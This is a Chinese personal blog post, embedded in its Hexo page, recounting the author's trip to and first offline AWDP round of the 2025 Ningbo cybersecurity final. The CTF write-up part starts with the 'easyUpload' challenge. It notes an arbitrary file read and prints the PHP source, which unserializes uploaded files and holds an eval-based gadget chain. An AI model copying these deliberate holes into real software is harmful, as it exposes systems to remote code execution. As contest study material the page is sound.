@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ayan0.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":280,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="记2025宁波市网络安全大赛决赛 纪念自己第一次参加线下赛，还是AWDP。。 前一天还在计划通后一天就打脸了哈哈，最后产出不是很好还是靠队友带了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记2025宁波网络安全大赛决赛">
+<meta property="og:url" content="https://ayan0.top/2025/09/07/%E8%AE%B02025%E5%AE%81%E6%B3%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/">
+<meta property="og:site_name" content="Blog of AyaN0">
+<meta property="og:description" content="记2025宁波市网络安全大赛决赛 纪念自己第一次参加线下赛，还是AWDP。。 前一天还在计划通后一天就打脸了哈哈，最后产出不是很好还是靠队友带了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907192822423.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907193950287.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907194327171.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907194654176.png">
+<meta property="article:published_time" content="2025-09-07T12:42:44.000Z">
+<meta property="article:modified_time" content="2025-09-07T12:44:40.415Z">
+<meta property="article:author" content="AyaN0">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907192822423.png">
+
+
+<link rel="canonical" href="https://ayan0.top/2025/09/07/%E8%AE%B02025%E5%AE%81%E6%B3%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ayan0.top/2025/09/07/%E8%AE%B02025%E5%AE%81%E6%B3%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/","path":"2025/09/07/记2025宁波网络安全大赛决赛/","title":"记2025宁波网络安全大赛决赛"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>记2025宁波网络安全大赛决赛 | Blog of AyaN0</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/lly.jpg" alt="Blog of AyaN0">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Blog of AyaN0</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%B02025%E5%AE%81%E6%B3%A2%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B"><span class="nav-number">1.</span> <span class="nav-text"> 记2025宁波市网络安全大赛决赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#day0"><span class="nav-number">1.1.</span> <span class="nav-text"> day0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day1"><span class="nav-number">1.2.</span> <span class="nav-text"> day1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wp"><span class="nav-number">1.3.</span> <span class="nav-text"> WP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easyupload"><span class="nav-number">1.3.1.</span> <span class="nav-text"> easyUpload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#break"><span class="nav-number">1.3.1.1.</span> <span class="nav-text"> break</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#image2base64"><span class="nav-number">1.3.2.</span> <span class="nav-text"> image2base64</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#break-2"><span class="nav-number">1.3.2.1.</span> <span class="nav-text"> break</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fix"><span class="nav-number">1.3.2.2.</span> <span class="nav-text"> fix</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy_shop"><span class="nav-number">1.3.3.</span> <span class="nav-text"> Easy_shop</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#break-3"><span class="nav-number">1.3.3.1.</span> <span class="nav-text"> break</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#genshop"><span class="nav-number">1.3.4.</span> <span class="nav-text"> genshop</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fix-2"><span class="nav-number">1.3.4.1.</span> <span class="nav-text"> fix</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AyaN0"
+      src="/images/lly.jpg">
+  <p class="site-author-name" itemprop="name">AyaN0</p>
+  <div class="site-description" itemprop="description">不断的前进的人:只有0次摔倒或无数次的爬起</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kisakiayano" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kisakiayano" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1594453512@qq.com" title="E-Mail → 1594453512@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ayan0.top/2025/09/07/%E8%AE%B02025%E5%AE%81%E6%B3%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lly.jpg">
+      <meta itemprop="name" content="AyaN0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of AyaN0">
+      <meta itemprop="description" content="不断的前进的人:只有0次摔倒或无数次的爬起">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="记2025宁波网络安全大赛决赛 | Blog of AyaN0">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记2025宁波网络安全大赛决赛
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-09-07 20:42:44 / 修改时间：20:44:40" itemprop="dateCreated datePublished" datetime="2025-09-07T20:42:44+08:00">2025-09-07</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>17k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>32 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="记2025宁波市网络安全大赛决赛"><a class="markdownIt-Anchor" href="#记2025宁波市网络安全大赛决赛"></a> 记2025宁波市网络安全大赛决赛</h1>
+<p>纪念自己第一次参加线下赛，还是AWDP。。</p>
+<p>前一天还在计划通后一天就打脸了哈哈，最后产出不是很好还是靠队友带了</p>
+<p>感谢pabgbai学长和文化木的带飞😇</p>
+<h2 id="day0"><a class="markdownIt-Anchor" href="#day0"></a> day0</h2>
+<p>大热天和huanghunr师傅早上做高铁赶到宁波，尼姆的14点的宁波真是要人命的热啊，好在没有中暑</p>
+<p>酒店的位置有点刁钻，对着地图找半天没找到以为被缺德地图坑了</p>
+<p>找到指示牌结果不小心做错楼层了(然后我还不知道)</p>
+<p>兜兜转转总算拿到房卡<s>铸币</s></p>
+<p>晚上由于其他两个师傅(metavii和kong)来的晚了点，本来说好和老登一起去赤寿喜烧，结果去晚了他们吃完了</p>
+<p>号还没到下去溜了一圈都没有发现号过了，前面要等100多桌</p>
+<p>含泪走进神必火锅店爆了米</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907192822423.png" alt="image-20250907192822423"></p>
+<p>貌似有驻唱，但是没心情去欣赏了说是</p>
+<p>回去的时候没仔细看群三个代币买了票结果工作人员给了一张免费体验地铁的券</p>
+<p>嗯?坏了,变成小丑了 🤡</p>
+<h2 id="day1"><a class="markdownIt-Anchor" href="#day1"></a> day1</h2>
+<p>紧张刺激的AWD</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907193950287.png" alt="image-20250907193950287"></p>
+<p>3h break+2h fix</p>
+<p>赛题会放在下面的(你先别急)</p>
+<p>11:30之前零产出血压直升，感觉都卡在了某个关键的地方，但是好在肾上腺素发力了出了两道还有一道3解一道0解题卡到最后半小时我直接去fix了</p>
+<p>fix第一轮感觉没什么问题，waf拉满结果第一轮check一个没过</p>
+<p>血压又高了。。</p>
+<p>我以为是漏洞点没修全不给过，就把那几个整数溢出修掉了结果第二轮还是没过就过了一个上waf(听huanghunr师傅说这道题他们一样的修第一轮没过第二轮过了，就加了最重要的管道符)</p>
+<p>中间还有小插曲:平台崩掉了</p>
+<p>虽然对fix影响不是特别大但是还是给大家乐得不行</p>
+<p>最后只有一个fix遗憾退场，一个php反序列化挂满waf不知道为什么没过啊，还有一个原型链服务器显示被waf了还是没check过也是没话好说i</p>
+<p>晚上和一堆老登出去恰饭，哎我 这牛排不赖😋</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907194327171.png" alt></p>
+<p>又去逛了一下谷子店,看到了挺多ip但是没看到爱马仕啊…又遗憾离场了</p>
+<p>最大的惊喜可能还是只看到海报没看到周边的点兔,绷</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907194654176.png" alt="image-20250907194654176"></p>
+<p>当然其实也收获了很多吧，会进攻不一定会防守，还有发现自己的代码审计跟上来了但是自己搓一些片段/脚本还是和史一样之类的。。</p>
+<h2 id="wp"><a class="markdownIt-Anchor" href="#wp"></a> WP</h2>
+<h3 id="easyupload"><a class="markdownIt-Anchor" href="#easyupload"></a> easyUpload</h3>
+<p>普通上传一张没回显上传路径,F12看一眼</p>
+<p>发现了<code>show.php?file=</code>明显的任意文件读</p>
+<p>当时不知道怎么了脑抽了没去读源码</p>
+<p>读到index.php</p>
+<h4 id="break"><a class="markdownIt-Anchor" href="#break"></a> break</h4>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+Class Dog &#123;
+    <span class="keyword">public</span> <span class="variable">$bone</span>;
+    <span class="keyword">public</span> <span class="variable">$meat</span>;
+    <span class="keyword">public</span> <span class="variable">$beef</span>;
+    <span class="keyword">public</span> <span class="variable">$candy</span>;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;
+        <span class="keyword">if</span> ((<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;meat) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;beef)) &amp;&amp; (<span class="variable language_">$this</span>-&gt;meat != <span class="variable language_">$this</span>-&gt;beef)) &#123;
+            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;candy-&gt;flag;
+        &#125;
+    &#125;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;
+        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;bone;
+        <span class="keyword">return</span> <span class="variable">$function</span>();
+    &#125;
+&#125;
+
+CLass mouse &#123;
+    <span class="keyword">public</span> <span class="variable">$rice</span>;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;
+        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;rice);
+    &#125;
+&#125;
+
+<span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;
+    <span class="keyword">public</span> <span class="variable">$fish</span>;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;
+    &#125;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;
+        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fish;
+    &#125;
+&#125;
+
+<span class="comment">// 处理文件上传</span>
+<span class="variable">$message</span> = <span class="string">&#x27;&#x27;</span>;
+<span class="variable">$success</span> = <span class="literal">false</span>;
+<span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;
+    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>])) &#123;
+        <span class="variable">$uploadDir</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/uploads/&#x27;</span>;
+        <span class="variable">$uploadedFile</span> = <span class="variable">$uploadDir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);
+
+        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadedFile</span>)) &#123;
+            <span class="variable">$message</span> = <span class="string">&#x27;上传成功！&#x27;</span>;
+            <span class="variable">$success</span> = <span class="literal">true</span>;
+
+            <span class="variable">$fileContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploadedFile</span>);
+            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$uploadedFile</span>);
+
+            @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$fileContent</span>);
+            <span class="variable">$fileContent</span> = <span class="string">&quot;&quot;</span>;
+
+            <span class="comment">// 设置 session，表示上传成功</span>
+            <span class="variable">$_SESSION</span>[<span class="string">&#x27;upload_success&#x27;</span>] = <span class="literal">true</span>;
+
+            <span class="comment">// 重定向，防止刷新页面时重复提交表单</span>
+            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);
+            <span class="keyword">echo</span> <span class="variable">$message</span>;
+            <span class="keyword">exit</span>();
+        &#125;
+    &#125;
+&#125;
+<span class="meta">?&gt;</span>
+&lt;!DOCTYPE html&gt;
+&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;
+&lt;head&gt;
+    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;
+    &lt;title&gt;壁纸上传网站&lt;/title&gt;
+    &lt;style&gt;
+        body &#123;
+            background: linear-<span class="title function_ invoke__">gradient</span>(<span class="number">135</span>deg, #<span class="number">000000</span>, #ffffff);
+            font-family: Arial, sans-serif;
+            color: <span class="comment">#333;</span>
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: <span class="number">100</span>vh;
+            margin: <span class="number">0</span>;
+        &#125;
+        .container &#123;
+            text-align: center;
+            background: <span class="title function_ invoke__">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>);
+            padding: <span class="number">30</span>px;
+            border-radius: <span class="number">10</span>px;
+            box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">15</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.2</span>);
+            width: <span class="number">400</span>px;
+        &#125;
+        h1 &#123;
+            font-size: <span class="number">24</span>px;
+            margin-bottom: <span class="number">20</span>px;
+            color: <span class="comment">#000;</span>
+        &#125;
+        .message &#123;
+            font-size: <span class="number">18</span>px;
+            color: green;
+            margin-bottom: <span class="number">20</span>px;
+        &#125;
+        input[type=<span class="string">&quot;file&quot;</span>] &#123;
+            margin: <span class="number">20</span>px <span class="number">0</span>;
+            font-size: <span class="number">16</span>px;
+        &#125;
+        input[type=<span class="string">&quot;submit&quot;</span>] &#123;
+            background-color: <span class="comment">#333;</span>
+            color: <span class="comment">#fff;</span>
+            border: none;
+            padding: <span class="number">10</span>px <span class="number">20</span>px;
+            cursor: pointer;
+            border-radius: <span class="number">5</span>px;
+        &#125;
+        input[type=<span class="string">&quot;submit&quot;</span>]:hover &#123;
+            background-color: <span class="comment">#555;</span>
+        &#125;
+        .images &#123;
+            margin-top: <span class="number">40</span>px;
+        &#125;
+        .images-title &#123;
+            font-size: <span class="number">20</span>px;
+            font-weight: bold;
+            margin-bottom: <span class="number">20</span>px;
+            color: <span class="comment">#444;</span>
+        &#125;
+        .image-item &#123;
+            display: inline-block;
+            margin: <span class="number">0</span> <span class="number">10</span>px;
+        &#125;
+        .image-item img &#123;
+            width: <span class="number">150</span>px;
+            height: <span class="number">150</span>px;
+            border-radius: <span class="number">10</span>px;
+            border: <span class="number">2</span>px solid <span class="comment">#333;</span>
+            transition: transform <span class="number">0.3</span>s;
+        &#125;
+        .image-item img:hover &#123;
+            transform: <span class="title function_ invoke__">scale</span>(<span class="number">1.1</span>);
+        &#125;
+        .image-item a &#123;
+            display: block;
+            margin-top: <span class="number">10</span>px;
+            color: <span class="comment">#333;</span>
+            text-decoration: none;
+            font-weight: bold;
+        &#125;
+        .image-item a:hover &#123;
+            color: <span class="comment">#555;</span>
+        &#125;
+    &lt;/style&gt;
+    &lt;script&gt;
+        <span class="function"><span class="keyword">function</span> <span class="title">showSuccessAlert</span>(<span class="params"></span>) </span>&#123;
+            <span class="title function_ invoke__">alert</span>(<span class="string">&quot;文件上传成功！&quot;</span>);
+        &#125;
+
+        <span class="comment">// 页面加载后检查是否上传成功</span>
+        window.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;
+            <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;upload_success&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;upload_success&#x27;</span>]) : <span class="meta">?&gt;</span>
+            <span class="title function_ invoke__">showSuccessAlert</span>();
+            <span class="meta">&lt;?php</span>
+            <span class="comment">// 清除 session 中的上传成功状态</span>
+            <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;upload_success&#x27;</span>]);
+            <span class="keyword">endif</span>;
+            <span class="meta">?&gt;</span>
+        &#125;
+    &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span>
+<span class="class">    &lt;<span class="title">h1</span>&gt;壁纸上传网站&lt;/<span class="title">h1</span>&gt;</span>
+<span class="class">    &lt;?<span class="title">php</span> <span class="title">if</span> (!<span class="title">empty</span>($<span class="title">message</span>)) : ?&gt;</span>
+<span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">message</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">message</span>; ?&gt;&lt;/<span class="title">div</span>&gt;</span>
+<span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span>
+<span class="class">    &lt;<span class="title">form</span> <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span>
+<span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">uploaded_file</span>&quot; <span class="title">required</span>&gt;</span>
+<span class="class">        &lt;<span class="title">br</span>&gt;</span>
+<span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;上传&quot;&gt;</span>
+<span class="class">    &lt;/<span class="title">form</span>&gt;</span>
+<span class="class"></span>
+<span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">images</span>&quot;&gt;</span>
+<span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">images</span>-<span class="title">title</span>&quot;&gt;精美壁纸如下：&lt;/<span class="title">div</span>&gt;</span>
+<span class="class"></span>
+<span class="class">        &lt;!-- 图片 1 --&gt;</span>
+<span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">image</span>-<span class="title">item</span>&quot;&gt;</span>
+<span class="class">            &lt;<span class="title">img</span> <span class="title">src</span>=&quot;./<span class="title">img</span>/1.<span class="title">png</span>&quot; <span class="title">alt</span>=&quot;壁纸1&quot;&gt;</span>
+<span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">show</span>.<span class="title">php</span>?<span class="title">file</span>=<span class="title">img</span>/1.<span class="title">png</span>&quot; <span class="title">target</span>=&quot;<span class="title">_blank</span>&quot;&gt;壁纸1&lt;/<span class="title">a</span>&gt;</span>
+<span class="class">        &lt;/<span class="title">div</span>&gt;</span>
+<span class="class"></span>
+<span class="class">        &lt;!-- 图片 2 --&gt;</span>
+<span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">image</span>-<span class="title">item</span>&quot;&gt;</span>
+<span class="class">            &lt;<span class="title">img</span> <span class="title">src</span>=&quot;./<span class="title">img</span>/2.<span class="title">png</span>&quot; <span class="title">alt</span>=&quot;壁纸2&quot;&gt;</span>
+<span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">show</span>.<span class="title">php</span>?<span class="title">file</span>=<span class="title">img</span>/2.<span class="title">png</span>&quot; <span class="title">target</span>=&quot;<span class="title">_blank</span>&quot;&gt;壁纸2&lt;/<span class="title">a</span>&gt;</span>
+<span class="class">        &lt;/<span class="title">div</span>&gt;</span>
+<span class="class"></span>
+<span class="class"></span>
+<span class="class">    &lt;/<span class="title">div</span>&gt;</span>
+<span class="class">&lt;/<span class="title">div</span>&gt;</span>
+<span class="class">&lt;/<span class="title">body</span>&gt;</span>
+<span class="class">&lt;/<span class="title">html</span>&gt;</span></code></pre>
